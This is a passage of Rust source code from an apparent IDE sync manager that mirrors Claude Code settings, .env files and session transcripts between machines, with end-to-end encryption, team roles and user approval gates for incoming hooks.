                "turn off .env sync on this machine first".into(),
            ));
        }
        self.client.delete_state(CLAUDE_ENV_SYNC_KEY).await?;
        let mut st = push_state.lock().await;
        st.known_version.remove(CLAUDE_ENV_SYNC_KEY);
        st.last_hash.remove(CLAUDE_ENV_SYNC_KEY);
        tracing::info!(target: "mnemos_ide_sync::manager", "removed the .env copy from the sync server");
        Ok(())
    }

    fn claude_env_enabled(&self) -> bool {
        self.claude_env.load(std::sync::atomic::Ordering::Relaxed)
    }

    /// Where this machine stands with the account's end-to-end encryption,
    /// and what absorbing plaintext has done this run.
    pub fn e2e_report(&self) -> crate::e2e::E2eReport {
        self.client.e2e_report()
    }

    /// Turn end-to-end encryption on for the account with `key`. The caller
    /// must have saved `key` on this machine first (losing it would lock
    /// every machine out), and restarts sync afterwards: the restart's pull
    /// and transcript listing encrypt what is on the server and delete the
    /// plaintext. Every machine must run a build with encryption before
    /// this: an older build keeps uploading plaintext, which the encrypted
    /// machines then absorb, and gets nothing back.
    pub async fn enable_e2e(&self, key: crate::crypto::SyncKey) -> Result<(), IdeError> {
        let client = self.client.clone();
        let result = sync_runtime()
            .spawn({
                let key = key.clone();
                async move { client.enable_e2e(&key).await }
            })
            .await
            .map_err(|e| IdeError::Other(format!("enable task failed: {e}")))?;
        result?;
        self.remember_e2e_key(&key);
        Ok(())
    }

    /// Check a typed recovery key against the account and use it from now
    /// on. The caller saves it on this machine and restarts sync.
    pub async fn unlock_e2e(
        &self,
        key: crate::crypto::SyncKey,
    ) -> Result<(), crate::e2e::UnlockError> {
        let client = self.client.clone();
        let result = sync_runtime()
            .spawn({
                let key = key.clone();
                async move { client.unlock_e2e(&key).await }
            })
            .await
            .map_err(|e| crate::e2e::UnlockError::Network(format!("unlock task failed: {e}")))?;
        result?;
        self.remember_e2e_key(&key);
        Ok(())
    }

    /// Stop using the recovery key saved for `profile_id` on this machine:
    /// the account's encrypted data is gone (deleted, or the marker lost and
    /// the user chose to start over), so this machine starts again
    /// unencrypted. The caller removes it from secure storage first and
    /// restarts sync, whose next start then resolves the status afresh.
    pub fn forget_e2e_key(&self, profile_id: &str) {
        self.e2e_keys
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .remove(profile_id);
        if self.profile_id_now().as_deref() == Some(profile_id) {
            self.client.set_local_e2e_key(None);
        }
    }

    fn remember_e2e_key(&self, key: &crate::crypto::SyncKey) {
        if let Some(pid) = self.profile_id_now() {
            self.e2e_keys
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .insert(pid, key.recovery_text());
        }
    }

    /// Hand the client the key saved for `pid`, if any (status is worked out
    /// again from the server's marker).
    fn load_e2e_key(&self, pid: Option<&str>) {
        let text = pid.and_then(|pid| {
            self.e2e_keys
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .get(pid)
                .cloned()
        });
        let key = text.and_then(|text| match crate::crypto::SyncKey::parse_recovery(&text) {
            Ok(key) => Some(key),
            Err(e) => {
                tracing::warn!(target: "mnemos_ide_sync::manager", "saved recovery key not usable: {e}");
                None
            }
        });
        self.client.set_local_e2e_key(key);
    }

    /// Subscribe to sync status. The receiver yields a fresh snapshot after
    /// every push/pull; UI polls or awaits `changed()`.
    pub fn status(&self) -> tokio::sync::watch::Receiver<SyncStatusSnapshot> {
        self.status_tx.subscribe()
    }

    /// The admin login behind this manager (see [`SyncStatusSnapshot::auth`]).
    pub fn auth_state(&self) -> SyncAuthState {
        self.status_tx.borrow().auth.clone()
    }

    /// The app could not save the login this manager was started with (the
    /// sign-in redirect's keyring write failed). Shown as `TokenNotSaved`
    /// until a refresh saves a pair cleanly.
    pub fn note_token_not_saved(&self, reason: String) {
        tracing::warn!(
            target: "mnemos_ide_sync::manager",
            "admin login is not in the keyring; the next start will be signed out: {reason}",
        );
        self.client.note_save_failed(reason);
        self.publish_session_health();
    }

    /// Mirror what the client has learned about the admin session into the
    /// status snapshot, notifying subscribers only when it changed. Returns
    /// whether the session is gone.
    fn publish_session_health(&self) -> bool {
        let auth = SyncAuthState::from_health(&self.client.session_health());
        let signed_out = auth.halts_sync();
        self.status_tx.send_if_modified(|s| {
            if s.auth == auth {
                return false;
            }
            s.auth = auth;
            true
        });
        signed_out
    }

    /// The run ends here because the server refused the session. The caller
    /// returns from the sync task right after, which drops the watcher and
    /// the transcript worker's job channel: nothing polls, pushes or retries
    /// with the dead token. `stop` still cleans up the handle.
    fn halt_signed_out(&self) {
        if matches!(self.auth_state(), SyncAuthState::UpdateRequired { .. }) {
            tracing::warn!(
                target: "mnemos_ide_sync::manager",
                "sync server needs a newer Mnemos; sync stopped until Mnemos is updated",
            );
        } else {
            tracing::warn!(
                target: "mnemos_ide_sync::manager",
                "admin session rejected; sync stopped until the next sign-in",
            );
        }
        self.status_tx.send_modify(|s| s.running = false);
    }

    /// Select the Drive team whose scope this machine participates in.
    /// `None` turns team participation off. Only OWNERS mirror config up
    /// (DA finding, 2026-07-30): members are pull-only, so joining a team
    /// never silently broadcasts a member's personal `~/.claude`, and the
    /// shared blobs have a single writer (no LWW clobber war).
    pub async fn set_team(
        &self,
        team_id: Option<String>,
        team_name: Option<String>,
        is_owner: bool,
    ) {
        *self.team_id.lock().await = team_id.clone();
        self.team_is_owner
            .store(is_owner, std::sync::atomic::Ordering::Relaxed);
        self.status_tx.send_modify(|s| {
            s.team_id = team_id;
            s.team_name = team_name;
            s.team_is_owner = is_owner;
        });
    }

    /// Take part in the team this machine chose ([`crate::team_choice`]).
    /// Called once at start. Never joins a team the user did not choose on
    /// this machine, except that a machine upgraded from a build that
    /// auto-joined keeps the team it had (`legacy_install`).
    async fn auto_select_team(self: &Arc<Self>, legacy_install: bool) {
        if self.team_id.lock().await.is_some() {
            return;
        }
        let Some(store) = self.paths.mnemos_store_dir.clone() else {
            return;
        };
        let choice = crate::team_choice::load(&store);
        let listed = match self.client.list_teams().await {
            Ok(teams) => Some(teams),
            Err(e) => {
                tracing::debug!(target: "mnemos_ide_sync::manager", "team list failed: {e:#}");
                None
            }
        };
        let decision =
            crate::team_choice::decide(choice.as_ref(), legacy_install, listed.as_deref());
        if let Some(record) = &decision.record {
            if let Err(e) = crate::team_choice::save(&store, record) {
                tracing::warn!(target: "mnemos_ide_sync::manager", "team choice not saved: {e}");
            }
        }
        let Some(teams) = listed else {
            return;
        };
        self.status_tx.send_modify(|s| s.teams = teams.clone());
        if let Some(t) = decision
            .selected
            .and_then(|id| teams.into_iter().find(|t| t.id == id))
        {
            let is_owner = t.role == "owner";
            tracing::info!(
                target: "mnemos_ide_sync::manager",
                team = %t.name,
                is_owner,
                "selected drive team",
            );
            self.set_team(Some(t.id), Some(t.name), is_owner).await;
        }
    }

    /// The user joined `team` on this machine (Settings > Sync): record it
    /// and take part from now on.
    pub async fn join_team(&self, team: crate::teams::Team) -> Result<(), IdeError> {
        let store = self
            .paths
            .mnemos_store_dir
            .clone()
            .ok_or_else(|| IdeError::Other("no Mnemos data dir".into()))?;
        crate::team_choice::save(
            &store,
            &crate::team_choice::TeamChoice {
                team_id: Some(team.id.clone()),
            },
        )
        .map_err(|e| IdeError::Other(format!("save team choice: {e}")))?;
        let is_owner = team.role == "owner";
        self.set_team(Some(team.id), Some(team.name), is_owner).await;
        Ok(())
    }

    /// Stop taking part in the team on this machine. The server membership
    /// stays (another machine may still use it); nothing is pulled from or
    /// pushed to the team here any more.
    pub async fn leave_team_here(&self) -> Result<(), IdeError> {
        if let Some(store) = self.paths.mnemos_store_dir.clone() {
            crate::team_choice::save(&store, &crate::team_choice::TeamChoice::default())
                .map_err(|e| IdeError::Other(format!("save team choice: {e}")))?;
        }
        self.set_team(None, None, false).await;
        Ok(())
    }

    /// Create a team called `name` (the user typed it) and take part in it
    /// here as its owner.
    pub async fn create_and_join_team(&self, name: &str) -> Result<(), IdeError> {
        let name = name.trim();
        if name.is_empty() {
            return Err(IdeError::Other("a team needs a name".into()));
        }
        let mut team = self.client.create_team(name).await?;
        team.role = "owner".into();
        self.status_tx.send_modify(|s| s.teams.push(team.clone()));
        self.join_team(team).await
    }

    /// Read-modify-write so a transient error or pending phase never
    /// regresses the recorded version or last-synced timestamp.
    fn status_key(&self, key: &str, version: Option<i64>, state: KeySyncState) {
        self.status_tx.send_modify(|s| {
            let entry = s.keys.entry(key.to_string()).or_insert(KeySyncStatus {
                version: 0,
                last_synced_at: None,
                state: KeySyncState::Pending,
            });
            if let Some(v) = version {
                entry.version = v;
            }
            if state == KeySyncState::InSync {
                entry.last_synced_at = Some(SystemTime::now());
            }
            entry.state = state;
        });
    }

    /// Convenience: build a manager from an `AdminAuth` already loaded from
    /// the keyring.
    pub fn from_auth(auth: AdminAuth) -> Self {
        Self::new(SyncClient::new(auth))
    }

    /// Inject the path to the Mnemos `settings.toml` user-preferences file.
    /// The app calls this with `mnemos_core::paths::config_local_dir()
    /// .join("settings.toml")` so the channel-aware path resolution stays
    /// out of this crate. When unset, the TOML is not synced.
    pub fn with_mnemos_settings_toml(mut self, path: PathBuf) -> Self {
        self.paths.mnemos_settings_toml = Some(path);
        self
    }

    /// The login was saved on this machine before the app started (the
    /// keyring had it), not made by a sign-in in this process. A machine
    /// like that synced under an earlier build, so a first start of this
    /// build keeps the team it took part in (see `crate::team_choice`), even
    /// without a `sync_baseline.json` (builds before 2026-09-28 never wrote
    /// one, and a moved data dir loses it).
    pub fn with_login_saved_earlier(mut self, saved_earlier: bool) -> Self {
        self.login_saved_earlier = saved_earlier;
        self
    }

    /// Which `settings.toml` paths sync and how (`crate::settings_toml`).
    /// Without a policy the file is not synced at all: nothing in it is
    /// known to be safe to share.
    pub fn with_settings_policy(mut self, policy: SettingsPolicy) -> Self {
        self.settings_policy = Some(policy);
        self
    }

    /// Override the Mnemos data dir used for `projects.json`,
    /// `workspace_state.json`, and `settings.json`. Primarily a test seam —
    /// production callers should let `Paths::discover()` resolve this from
    /// `mnemos_ide_core::paths::ide_data_dir()`.
    #[cfg(test)]
    fn with_mnemos_store_dir(mut self, dir: PathBuf) -> Self {
        self.paths.mnemos_store_dir = Some(dir);
        self
    }

    /// Test seam: act as if `home` were the user's home directory, so a test
    /// that starts the whole manager never reads or writes the real
    /// `~/.claude`.
    #[cfg(test)]
    fn with_claude_home(mut self, home: &Path) -> Self {
        self.paths.claude_dir = home.join(".claude");
        self.paths.claude_json = home.join(".claude.json");
        self.paths.claude_projects_dir = self.paths.claude_dir.join("projects");
        self
    }

    fn transcripts(&self) -> Option<Arc<TranscriptSync>> {
        self.transcripts
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .clone()
    }

    /// Build transcript sync for this run and start its worker. `None` when
    /// there is no Mnemos data dir to keep its local state in.
    fn start_transcripts(
        self: &Arc<Self>,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Option<mpsc::UnboundedSender<TranscriptJob>> {
        let store_dir = self.paths.mnemos_store_dir.clone()?;
        let mut sync = TranscriptSync::new(
            (*self.client).clone(),
            store_dir,
            self.paths.claude_projects_dir.clone(),
        );
        // Same registry files `apply_projects` writes, so both sides of this
        // manager learn paths into one `projects.json` (and a test manager
        // never reaches the real one).
        if let (Some(projects), Some(workspace_state)) = (
            self.paths.projects_json(),
            self.paths.workspace_state_json(),
        ) {
            sync = sync.with_registry_files(projects, workspace_state);
        }
        let sync = Arc::new(sync);
        *self.transcripts.lock().unwrap_or_else(|e| e.into_inner()) = Some(sync.clone());
        let (tx, rx) = mpsc::unbounded_channel();
        let worker = spawn_transcript_worker(self.clone(), push_state.clone(), sync, rx);
        let previous = self
            .transcript_worker
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .replace(worker);
        if let Some(previous) = previous {
            previous.abort();
        }
        Some(tx)
    }

    /// Spawn the sync loop. Idempotent — calling `start` while already
    /// running is a no-op.
    ///
    /// The entire sync pipeline (initial pull/push + watcher event loop)
    /// runs on the crate's OWN tokio runtime: the caller (Mnemos) drives
    /// futures on a non-tokio app executor, where `tokio::spawn` /
    /// `tokio::time` panic. A bare `tokio::spawn` here previously killed
    /// the event loop silently right after the initial sync — startup sync
    /// worked, live file-watch pushes never happened.
    pub async fn start(self: Arc<Self>) -> Result<(), IdeError> {
        {
            let guard = self.handle.lock().unwrap();
            if guard.is_some() {
                tracing::debug!(target: "mnemos_ide_sync::manager", "start() called but already running");
                return Ok(());
            }
        }

        // The gates (hooks opt-in, pending approvals) as saved here.
        self.publish_gates(self.read_gates(|g| (g.hooks_sync, g.pending_list())));

        // Mark running before the initial pull/push so UI subscribing early
        // doesn't render "sync off" during the (potentially long) first sync.
        self.status_tx.send_modify(|s| s.running = true);
        // Read before this run writes the baseline: a machine that synced
        // under an earlier build (see `team_choice`).
        let legacy_install = crate::team_choice::legacy_install(
            self.paths
                .sync_baseline_json()
                .is_some_and(|p| p.exists()),
            self.login_saved_earlier,
        );

        let (shutdown_tx, shutdown_rx) = tokio::sync::watch::channel(false);
        let (event_tx, event_rx) = mpsc::unbounded_channel();
        let (command_tx, command_rx) = mpsc::unbounded_channel();
        let watch_paths = self.collect_watch_paths();
        let watcher = match SyncWatcher::new(&watch_paths, event_tx) {
            Ok(w) => w,
            Err(e) => {
                self.status_tx.send_modify(|s| {
                    s.running = false;
                    s.first_pull_done = true;
                    s.first_transcript_pull_done = true;
                });
                return Err(IdeError::Other(format!("watcher init: {e}")));
            }
        };

        let me = self.clone();
        let join = sync_runtime().spawn(async move {
            // Pre-resolve profile id from the JWT. Failure is non-fatal —
            // non-memory keys still sync; a later refresh fills it in.
            let pid = me.refresh_profile_id().await;
            me.load_e2e_key(pid.as_deref());
            let claude_env = me.sync_options().claude_env;
            me.claude_env
                .store(claude_env, std::sync::atomic::Ordering::Relaxed);
            tracing::info!(
                target: "mnemos_ide_sync::manager",
                profile_id = pid.as_deref().unwrap_or("<unresolved>"),
                "starting sync manager",
            );

            let push_state = Arc::new(AsyncMutex::new(PushState::default()));
            // Built on the sync runtime (not the caller's executor) and before
            // the first pull, so classify sees it from the first event on.
            let transcript_jobs = me.start_transcripts(&push_state);
            if transcript_jobs.is_none() {
                me.status_tx
                    .send_modify(|s| s.first_transcript_pull_done = true);
            }
            me.auto_select_team(legacy_install).await;
            // A start on a machine that is still offline (just woken, Wi-Fi
            // not up) must not leave every key stuck in Error forever, so the
            // transient failures here are handed to the event loop's retry
            // schedule rather than swallowed.
            let mut retry_pull = false;
            if let Err(e) = me.do_pull_all(&push_state, PullScope::Everything).await {
                tracing::warn!(target: "mnemos_ide_sync::manager", "initial pull failed: {e:#}");
                retry_pull = is_transient(&e);
            }
            me.status_tx.send_modify(|s| {
                s.first_pull_done = true;
                // Offline: the transcript pull waits for the retry schedule,
                // which is no reason to hold agent restore up.
                s.first_transcript_pull_done |= retry_pull;
            });
            // Refused at startup (the team lookup or the pull asked for a
            // refresh): every push below would fail the same way.
            if me.publish_session_health() {
                me.status_tx
                    .send_modify(|s| s.first_transcript_pull_done = true);
                me.halt_signed_out();
                return;
            }
            // The first transcript pull goes out before the initial push:
            // agent restore waits for it (the other machine's newest turns
            // decide between resuming in place and forking), and the push of
            // every key can take longer than restore is willing to wait.
            // The worker runs it ahead of any sweep while it is the first
            // one (`run_transcript_worker`).
            if let Some(jobs) = &transcript_jobs {
                if !retry_pull {
                    let _ = jobs.send(TranscriptJob::Pull);
                }
            }
            let retry_scopes = me.do_push_initial(&push_state).await;
            // The sweep last and in the background: a first sweep can upload
            // weeks of sessions, which must not hold up every other key.
            if let Some(jobs) = &transcript_jobs {
                let _ = jobs.send(TranscriptJob::Sweep);
            }

            let watcher = watcher; // keep the notify thread alive
            let channels = LoopChannels {
                events: event_rx,
                commands: command_rx,
                transcript_jobs,
            };
            me.run_event_loop(channels, push_state, shutdown_rx, retry_scopes, retry_pull)
                .await;
            drop(watcher);
        });

        {
            let mut guard = self.handle.lock().unwrap();
            *guard = Some(RunningManager {
                shutdown_tx,
                commands: command_tx,
                join: Some(join),
            });
        }
        // The task above may already have halted on a refused session.
        self.status_tx
            .send_modify(|s| s.running = !s.auth.halts_sync());
        Ok(())
    }

    /// Halt the watcher and join the background task. Safe to call multiple times.
    pub async fn stop(self: Arc<Self>) -> Result<(), IdeError> {
        let running = self.handle.lock().unwrap().take();
        let Some(running) = running else {
            // Not running, but a worker may outlive a start that failed.
            self.stop_transcript_worker().await;
            return Ok(());
        };
        let _ = running.shutdown_tx.send(true);
        if let Some(j) = running.join {
            let _ = j.await;
        }
        // The loop dropped its job sender, but the worker would still finish
        // the batch it is in (a sweep can upload every transcript) and retry
        // a failed upload once more, with a client whose tokens are still
        // valid. Cancel it at its next await point and wait for that, so
        // nothing from this run reaches the server (or the keyring, through
        // a refresh) once `stop` returns.
        self.stop_transcript_worker().await;
        // Drop cached identity so a sign-in-as-different-user starts clean.
        let mut pid = self.profile_id.lock().await;
        *pid = None;
        drop(pid);
        *self.transcripts.lock().unwrap_or_else(|e| e.into_inner()) = None;
        self.status_tx.send_modify(|s| s.running = false);
        tracing::info!(target: "mnemos_ide_sync::manager", "sync manager stopped");
        Ok(())
    }

    /// Abort the transcript worker, if one runs, and wait until it is gone.
    /// A batch cut short loses nothing that matters: the next run's sweep
    /// uploads whatever the server does not have yet.
    async fn stop_transcript_worker(&self) {
        let worker = self
            .transcript_worker
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .take();
        if let Some(worker) = worker {
            worker.abort();
            let _ = worker.await;
        }
    }

    /// Trigger an immediate full pull (for app focus): every key, then a
    /// full-listing transcript pull. Honors a 5-second floor so back-to-back
    /// focus events don't spam the server.
    ///
    /// Runs inside the event loop, so it shares the loop's known versions
    /// and echo suppression, and its HTTP calls run on the sync runtime
    /// rather than the caller's executor.
    pub async fn pull_now(self: Arc<Self>) -> Result<(), IdeError> {
        let commands = {
            let guard = self.handle.lock().unwrap();
            match guard.as_ref() {
                Some(running) => running.commands.clone(),
                None => return Ok(()), // not running — nothing to do
            }
        };
        let (reply_tx, reply_rx) = oneshot::channel();
        if commands.send(LoopCommand::PullNow(reply_tx)).is_err() {
            return Ok(()); // loop already gone (stopping)
        }
        // A dropped reply means the loop shut down mid-request.
        reply_rx.await.unwrap_or(Ok(()))
    }

    // ---- Approval gates (`crate::gates`) ----

    fn gates_path(&self) -> Option<PathBuf> {
        self.paths
            .mnemos_store_dir
            .as_ref()
            .map(|d| d.join(gates::GATES_FILE_NAME))
    }

    /// Run `f` on this machine's gate store, loaded on first use.
    fn read_gates<R>(&self, f: impl FnOnce(&GateStore) -> R) -> R {
        let mut guard = self.gates.lock().unwrap_or_else(|e| e.into_inner());
        let store = guard.get_or_insert_with(|| {
            self.gates_path()
                .map(|p| GateStore::load(&p))
                .unwrap_or_default()
        });
        f(store)
    }

    /// Run `f` on the gate store; when it changed anything, save the store
    /// and update the status snapshot.
    fn update_gates<R>(&self, f: impl FnOnce(&mut GateStore) -> R) -> R {
        let (result, after) = {
            let mut guard = self.gates.lock().unwrap_or_else(|e| e.into_inner());
            let store = guard.get_or_insert_with(|| {
                self.gates_path()
                    .map(|p| GateStore::load(&p))
                    .unwrap_or_default()
            });
            let before = store.clone();
            let result = f(store);
            if *store != before {
                if let Some(path) = self.gates_path() {
                    if let Err(e) = store.save(&path) {
                        tracing::warn!(target: "mnemos_ide_sync::manager", "sync gates not saved: {e}");
                    }
                }
            }
            (result, (store.hooks_sync, store.pending_list()))
        };
        self.publish_gates(after);
        result
    }

    fn publish_gates(&self, (hooks_sync, pending): (bool, Vec<PendingApproval>)) {
        self.status_tx.send_if_modified(|s| {
            if s.hooks_sync == hooks_sync && s.pending_approvals == pending {
                return false;
            }
            s.hooks_sync = hooks_sync;
            s.pending_approvals = pending;
            true
        });
    }

    /// Whether hooks sync is opted in on this machine.
    pub fn hooks_sync_enabled(&self) -> bool {
        self.read_gates(|g| g.hooks_sync)
    }

    /// Turn hooks sync on or off on this machine. Turning it on applies
    /// nothing by itself: every incoming hook still waits for approval.
    pub fn set_hooks_sync(&self, on: bool) {
        let changed = self.update_gates(|g| {
            let changed = g.hooks_sync != on;
            g.hooks_sync = on;
            if !on {
                g.pending.retain(|_, p| !gates::needs_hooks_opt_in(&p.key));
            }
            changed
        });
        if changed {
            self.send_command(LoopCommand::GatesChanged);
        }
    }

    /// Approve the pending items `ids` (`PendingApproval::id`): their
    /// content is applied by the re-apply this queues.
    pub fn approve_pending(&self, ids: &[String]) {
        if !self.update_gates(|g| g.approve(ids)).is_empty() {
            self.send_command(LoopCommand::GatesChanged);
        }
    }

    /// Dismiss the pending items `ids`: never applied here, no longer
    /// listed, and this machine's own copy is pushed again.
    pub fn dismiss_pending(&self, ids: &[String]) {
        if !self.update_gates(|g| g.dismiss(ids)).is_empty() {
            self.send_command(LoopCommand::GatesChanged);
        }
    }

    fn send_command(&self, command: LoopCommand) {
        let guard = self.handle.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(running) = guard.as_ref() {
            let _ = running.commands.send(command);
        }
    }

    fn trusts_all_gates(&self) -> bool {
        #[cfg(test)]
        let trust = self.trust_gates.load(std::sync::atomic::Ordering::Relaxed);
        #[cfg(not(test))]
        let trust = false;
        trust
    }

    /// A key this machine neither pushes nor pulls right now: hooks and the
    /// statusline script without the hooks opt-in, and `.env` while its sync
    /// is off here. A skipped key is neither applied nor recorded (version,
    /// baseline), so turning it on later starts from what is on disk here
    /// rather than from a server copy that was never written.
    fn key_skipped(&self, key: &str) -> bool {
        (gates::skipped_without_hooks_opt_in(key) && !self.hooks_sync_enabled())
            || (key == CLAUDE_ENV_SYNC_KEY && !self.claude_env_enabled())
    }

    /// After an opt-in key (`.env`) was turned on: the server's copy is
    /// resolved against the local file as at startup (a local file changed
    /// here since the last sync is kept, never silently replaced), then the
    /// key is pushed.
    async fn resolve_opt_in_key(
        self: &Arc<Self>,
        key: &'static str,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) {
        if self.key_skipped(key) {
            return;
        }
        match self.client.get_state(key).await {
            Ok(Some(state)) => self.apply_startup_file(&state, push_state).await,
            Ok(None) => {}
            Err(e) => tracing::warn!(
                target: "mnemos_ide_sync::manager",
                key,
                "pull after turning sync on failed: {e:#}",
            ),
        }
        if let Some(scope) = scope_for_key(key) {
            push_state.lock().await.push_requests.insert(scope);
        }
    }

    /// This machine's current slot of a gated key, read from disk.
    async fn gate_local_slot(&self, key: &str) -> Value {
        match gates::gate_kind(key) {
            Some(GateKind::Directory) => DIRECTORIES
                .iter()
                .find(|d| d.sync_key == key)
                .and_then(|cfg| serialize_directory(&self.paths.claude_dir.join(cfg.relative), cfg))
                .unwrap_or_else(|| json!({})),
            Some(GateKind::McpEntries) => tokio::fs::read(&self.paths.claude_json)
                .await
                .ok()
                .and_then(|bytes| serde_json::from_slice::<Value>(&bytes).ok())
                // Compared with the pulled slot, which never carries `env`
                // or `headers` (`strip_mcp_secrets`): a server that only
                // differs by its local secrets is not a change.
                .and_then(|v| v.get("mcpServers").map(strip_mcp_secrets))
                .unwrap_or_else(|| json!({})),
            Some(GateKind::SettingsCommands | GateKind::WholeText) => {
                let Some(cfg) = GLOBAL_FILES.iter().find(|f| f.sync_key == key) else {
                    return Value::Null;
                };
                let Ok(bytes) = tokio::fs::read(self.paths.claude_dir.join(cfg.file_name)).await
                else {
                    return Value::Null;
                };
                if cfg.raw {
                    Value::String(String::from_utf8_lossy(&bytes).into_owned())
                } else {
                    match serde_json::from_slice::<Value>(&bytes) {
                        Ok(v) if cfg.platform_specific => strip_nested_platform_keys(v),
                        Ok(v) => v,
                        Err(_) => Value::Null,
                    }
                }
            }
            None => Value::Null,
        }
    }

    /// Recompute which items of `key`'s incoming value (`server_value`, as
    /// the server or the team holds it) wait for approval here.
    async fn refresh_gate_pending(&self, key: &str, server_value: &Value, source: GateSource) {
        let Some(kind) = gates::gate_kind(key) else {
            return;
        };
        let frozen = gates::needs_hooks_opt_in(key) && !self.hooks_sync_enabled();
        if frozen || self.trusts_all_gates() {
            self.update_gates(|g| g.replace_pending(key, source, Vec::new()));
            return;
        }
        let mut server_slot = gate_slot(key, server_value).unwrap_or(Value::Null);
        let local = self.gate_local_slot(key).await;
        if kind == GateKind::SettingsCommands {
            // Secret env values never come from the server (gates::hold_secret_env).
            server_slot = gates::hold_secret_env(server_slot, Some(&local));
        }
        self.update_gates(|g| {
            let items = gates::pending_items(kind, key, &server_slot, &local, g, source);
            g.replace_pending(key, source, items)
        });
    }

    /// `value` (about to be written here) with every unapproved change to a
    /// gated item put back to this machine's copy. Without the hooks
    /// opt-in, a settings key keeps this machine's commands.
    async fn gate_incoming(&self, key: &str, value: &Value) -> Value {
        let Some(kind) = gates::gate_kind(key) else {
            return value.clone();
        };
        let Some(slot) = gate_slot(key, value) else {
            return value.clone();
        };
        let local = self.gate_local_slot(key).await;
        let filtered = if kind == GateKind::SettingsCommands && !self.hooks_sync_enabled() {
            gates::keep_local_commands(slot, &local)
        } else {
            // Secret env values never come from the server: this machine's
            // stay (gates::hold_secret_env).
            let slot = if kind == GateKind::SettingsCommands {
                gates::hold_secret_env(slot, Some(&local))
            } else {
                slot
            };
            let trust = self.trusts_all_gates();
            let (slot, held) =
                self.read_gates(|g| gates::filter_incoming(kind, key, slot, &local, g, trust));
            if !held.is_empty() {
                tracing::info!(
                    target: "mnemos_ide_sync::manager",
                    key,
                    held = held.len(),
                    "incoming change waits for approval on this machine (Settings > Sync)",
                );
            }
            slot
        };
        with_gate_slot(key, value.clone(), filtered)
    }

    /// `local_value` (about to be pushed) with every item pending approval
    /// here taken from the server's copy, and without the hooks opt-in the
    /// server's settings commands in place of this machine's.
    fn gate_outgoing(&self, key: &str, local_value: Value, remote_value: &Value) -> Value {
        let Some(kind) = gates::gate_kind(key) else {
            return local_value;
        };
        let Some(local_slot) = gate_slot(key, &local_value) else {
            return local_value;
        };
        let remote_slot = if remote_value.is_null() {
            None
        } else {
            gate_slot(key, remote_value)
        };
        let freeze = gates::needs_hooks_opt_in(key) && !self.hooks_sync_enabled();
        let slot = self.read_gates(|g| {
            gates::protect_outgoing(kind, key, local_slot, remote_slot.as_ref(), g, freeze)
        });
        with_gate_slot(key, local_value, slot)
    }

    /// After a gate change: apply every gated key again from the server
    /// (approved items now land; the hooks opt-in pulls hooks for the first
    /// time, never removing a local file) and push it, then the team's.
    async fn reapply_gates(self: &Arc<Self>, push_state: &Arc<AsyncMutex<PushState>>) {
        for key in gates::GATED_KEYS {
            if self.key_skipped(key) {
                continue;
            }
            match self.client.get_state(key).await {
                Ok(Some(state)) => {
                    self.apply_pulled_as(&state, &state.value, ApplyMode::NoDelete, push_state)
                        .await
                }
                Ok(None) => {}
                Err(e) => tracing::warn!(
                    target: "mnemos_ide_sync::manager",
                    key,
                    "re-apply after a gate change failed: {e:#}",
                ),
            }
            if let Some(scope) = scope_for_key(key) {
                push_state.lock().await.push_requests.insert(scope);
            }
        }
        self.do_pull_team(push_state, None).await;
    }

    /// Whether a full pull finished less than `window` ago.
    fn pulled_within(&self, window: Duration) -> bool {
        self.status_tx
            .borrow()
            .last_pull_at
            .and_then(|t| t.elapsed().ok())
            .is_some_and(|age| age < window)
    }

    /// Re-resolve the admin profile id from the JWT, caching it for memory
    /// key construction. Errors are swallowed (we just clear the cache).
    async fn refresh_profile_id(self: &Arc<Self>) -> Option<String> {
        let token = {
            let auth = self.client.auth.lock().await;
            auth.tokens.as_ref().map(|t| t.access_token.clone())
        };
        let pid = token.as_deref().and_then(extract_profile_id_from_jwt);
        let mut guard = self.profile_id.lock().await;
        *guard = pid.clone();
        pid
    }

    fn collect_watch_paths(&self) -> Vec<WatchTarget> {
        let mut targets = Vec::new();
        if let Some(p) = self.paths.projects_json() {
            targets.push(WatchTarget::file(p));
        }
        // `workspace_state.json` is deliberately not watched: it is
        // per-machine tab state and never pushed.
        if let Some(p) = self.paths.settings_json() {
            targets.push(WatchTarget::file(p));
        }
        if let Some(p) = self.paths.mnemos_settings_toml() {
            targets.push(WatchTarget::file(p.to_path_buf()));
        }
        for f in GLOBAL_FILES {
            targets.push(WatchTarget::file(self.paths.claude_dir.join(f.file_name)));
        }
        targets.push(WatchTarget::file(self.paths.claude_json.clone()));
        for d in DIRECTORIES {
            targets.push(WatchTarget::dir(self.paths.claude_dir.join(d.relative)));
        }
        // Memory dirs and transcripts per project: the projects/ root,
        // recursively, so every project's files are caught. Watched even
        // before it exists (a machine that has not run Claude Code yet): the
        // watcher arms it once it appears.
        targets.push(WatchTarget::dir(self.paths.claude_projects_dir.clone()));
        targets
    }

    async fn run_event_loop(
        self: Arc<Self>,
        channels: LoopChannels,
        push_state: Arc<AsyncMutex<PushState>>,
        mut shutdown_rx: tokio::sync::watch::Receiver<bool>,
        initial_retry_scopes: Vec<DebounceScope>,
        initial_retry_pull: bool,
    ) {
        let LoopChannels {
            events: mut event_rx,
            commands: mut command_rx,
            transcript_jobs,
        } = channels;
        // Per-scope debounce: track the last activity timestamp; on each
        // event we reset it. A periodic ticker fires the actual pushes.
        let mut last_seen: HashMap<DebounceScope, Instant> = HashMap::new();
        // Scopes whose last push died on a transient failure. Sync is
        // otherwise purely event-driven, so without this a key that fails
        // while offline stays in Error until its file happens to change
        // again — which for a stable ~/.claude/agents is never.
        let mut retry: HashMap<DebounceScope, RetrySchedule> = HashMap::new();
        for scope in initial_retry_scopes {
            retry.insert(scope, RetrySchedule::first());
        }
        let mut retry_pull: Option<RetrySchedule> = initial_retry_pull.then(RetrySchedule::first);
        // Changed transcripts waiting for their idle window, and when the
        // oldest of them started waiting (for the max-wait cap).
        let mut pending_transcripts: HashSet<PathBuf> = HashSet::new();
        let mut transcripts_waiting_since: Option<Instant> = None;
        // Live pull. The poll backs off on failure (never faster than its
        // normal interval) so an offline machine does not hammer the server.
        let mut next_projects_poll = Instant::now() + PROJECTS_POLL_INTERVAL;
